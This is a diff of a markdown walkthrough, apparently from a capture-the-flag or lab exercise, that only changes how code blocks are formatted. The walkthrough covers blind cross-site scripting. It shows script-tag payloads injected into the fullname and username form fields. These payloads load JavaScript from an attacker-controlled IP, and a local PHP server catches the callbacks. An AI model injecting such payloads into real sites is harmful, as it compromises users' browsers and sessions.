@@ -45,7 +45,7 @@ sudo php -S 0.0.0.0:80
 
 **Fields Tested:**
 
-fullname: "><script src=http://10.10.14.179/fullname></script>
+fullname: ```bash "><script src=http://10.10.14.179/fullname></script> ```
 
 username: "><script src=http://10.10.14.179/username></script>
 
@@ -64,7 +64,11 @@ Checked server logs for requests (e.g., GET /fullname).
 Vulnerable field identified when a request appeared.
 
 ### 3. Exploit with XSS
-**Payload**: ```bash "><script src=http://10.10.14.179/script.js></script> ```
+**Payload**: 
+
+```bash ">
+<script src=http://10.10.14.179/script.js></script>
+```
 
 Inject this script into the vulnerable field
 
